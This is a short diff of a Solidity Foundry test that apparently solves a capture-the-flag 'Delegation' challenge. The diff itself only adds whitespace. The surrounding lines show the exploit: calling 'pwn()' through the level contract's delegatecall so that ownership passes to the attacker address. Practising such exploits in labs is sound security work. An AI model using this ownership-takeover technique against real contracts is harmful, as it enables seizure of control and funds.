@@ -14,7 +14,9 @@ contract DelegationTest is Test {
     address hacker = vm.addr(0x2); 
 
     function setUp() public {
+
         vm.prank(instance);
+        
     }
 
     function testDelegationHack() public {
@@ -26,6 +28,7 @@ contract DelegationTest is Test {
         (bool success, ) = address(level).call(
             abi.encodeWithSignature("pwn()")
         );
+
         assertTrue(success);
         assertEq(level.owner(), hacker);
 
